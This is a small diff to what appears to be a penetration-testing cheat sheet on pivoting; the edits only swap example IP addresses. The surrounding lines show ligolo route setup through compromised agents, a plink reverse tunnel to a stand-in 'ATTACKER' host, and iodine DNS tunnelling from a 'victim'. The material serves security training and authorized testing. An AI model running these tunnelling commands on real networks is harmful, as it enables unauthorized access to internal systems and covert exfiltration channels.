@@ -149,7 +149,7 @@ sudo ip route add 172.16.0.0/16 dev ligolo
 # Agent 1 on DMZ → tunnel to internal network 1
 # Agent 2 on internal network 1 → tunnel to internal network 2
 # Add routes for both networks on attacker
-sudo ip route add 10.0.0.0/24 dev ligolo    # via agent 1
+sudo ip route add 192.168.1.0/24 dev ligolo    # via agent 1
 sudo ip route add 172.16.0.0/24 dev ligolo  # via agent 2
 ```
 
@@ -235,7 +235,7 @@ echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER
 ```bash
 # iodine — IP-over-DNS
 # Server (attacker, with NS record pointing to attacker):
-iodined -f -c -P password 10.0.0.1 t1.yourdomain.com
+iodined -f -c -P password 192.168.1.1 t1.yourdomain.com
 
 # Client (victim):
 iodine -f -P password t1.yourdomain.com
